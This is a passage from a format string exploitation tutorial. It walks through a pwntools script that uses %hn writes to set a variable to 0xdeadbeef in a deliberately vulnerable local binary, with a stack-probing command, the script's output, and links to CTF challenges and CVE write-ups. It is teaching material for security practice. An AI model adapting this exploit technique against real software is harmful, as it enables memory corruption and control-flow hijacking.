- The address of `i` two lower bytes, which is the address of `i`
- The address of `i` higher bytes, aka `&i + 2`
- A `%0<n>x` conversion to reach 0xbeef characters printed (we already have 8
  characters printed by the addresses)
- A `%hn` conversion to write `0xbeef` into `i` lower bytes
- A `%0<n>x` conversion to reach 0xdead characters printed (we already have
  0xbeef characters printed)
- A `%hn` conversion to write `0xdead` into `i` higher bytes


Therefore, in order to create the format string we need to know:

- the address of `i`, which is given us by the program (in a real
  world example you may need to exploit another vulnerability, or even
  the same)
- the value we want to write into `i` that is `0xdeadbeef` (in
  a real exploit may be an address)

- The position at the stack from which we are going to retrieve the
  address of `i`, that is the position where our format string begins
  in this example.

At this point, we need still need to get this last piece of
information, and for this we can dump the string values:

```sh
$ perl -e 'print "AAAA " . "%p|"x8 ' | ./fsv-write-local-big
i is at: 0xff892cbc
AAAA 0x64|0xf7f00620|0x565c41d5|0xf7f61ff4|0x2c|0x41414141|0x7c702520|0x257c7025|
i = 539
```

We can see that our format string starts in the sixth position of the
stack (`0x41414141`), so  we are going to set in the sixth and seventh
positions the addresses of `i` and `&i + 2`. With this information we
should be able to create our exploit.

The following script, made with [pwntools](https://github.com/Gallopsled/pwntools), contains the logic of
our exploit. Take your time to understand and play with it:

```python
from pwn import *

# set the platform of the process we are going to launch
# so functions are adapted to this specific platform
context(arch = 'i386', os = 'linux')


# spawn the process
io = process("./fsv-write-local-big")

# receive the input
line = io.recvline()
print("Program printed:", line)

# take the hexadecimal value and convert it to a number
addr = int(line[-11:-1], 0)

# convert the addr number into byte characters that represent the value
# make sure context is properly set for this to work correctly
b_addr = pack(addr)
print("Address is {} -> {}".format(hex(addr), b_addr))

b_next_addr = pack(addr + 2)

# create format string that includes:
# addr + (addr + 2) + print (0xbeef - 8) chars + %hn \
# + print (0xdead - 0xbeef) chars + %hn
format_str = b_addr + b_next_addr + b"%048871x" + b"%6$hn" + b"%08126x" + b"%7$hn"
print("Our format string:", format_str)

# send format string with a newline to help send it properly
# (it returns errors sometimes if newline is not added)
io.sendline(format_str + b"\n")

# Receive the output and redirect to shell
io.stream()

```

Then we can execute our script. Remember to install [pwntools](https://github.com/Gallopsled/pwntools) if you don't
have it (in a python virtual environment if possible). I already had installed
it in a previous example in my `fsv` virtual environment so I will activate the
python environment and execute the script:

```sh
$ workon fsv
(fsv) $ python3 fsv-write-local-big-ex.py
[x] Starting local process './fsv-write-local-big'
[+] Starting local process './fsv-write-local-big': pid 2126
Program printed: b'i is at: 0xff91307c\n'
Address is 0xff91307c -> b'|0\x91\xff'
Our format string: b'|0\x91\xff~0\x91\xff%048871x%6$hn%08126x%7$hn'
[*] Process './fsv-write-local-big' stopped with exit code 13 (pid 2126)
|0��~0��000000000...stripped...00000f7f52620

i = deadbeef
You got it!!
```

And we got it!! We were able to successfully write a big value into a memory
address. In a real world exploit we probably wanted to overwrite some place in
memory that allows us to change the execution flow, such as the return address
in the stack, the [GOT table](https://infosecwriteups.com/got-overwrite-bb9ff5414628), or a function pointer of a [C++ virtual table](https://www.learncpp.com/cpp-tutorial/the-virtual-table/).

## More on Format String Vulnerabilities

At this point, you have all the basics of how format string vulnerabilities
work, so go try to put your knowledge at test. For example, in
[Root-Me App-System challenges](https://www.root-me.org/en/Challenges/App-System/) you can find several format string
vulnerability exercises.

Additionally, I left some format string vulnerabilities in real life, that
describes more complex scenarios:
- [CVE-2024-29510 – Exploiting Ghostscript using format strings](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/)
- [Fortinet FortiGate CVE-2024-23113 - A Super Complex Vulnerability In A Super
  Secure Appliance In 2024](https://labs.watchtowr.com/fortinet-fortigate-cve-2024-23113-a-super-complex-vulnerability-in-a-super-secure-appliance-in-2024/)

## Resources

- [Exploiting Format String Vulnerabilities](https://websec-lab.github.io/courses/2025s-cse467/metarials/formatstring.pdf)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)
- 2002 [Advances in format string exploitation](https://phrack.org/issues/59/7#article) by gera and riq
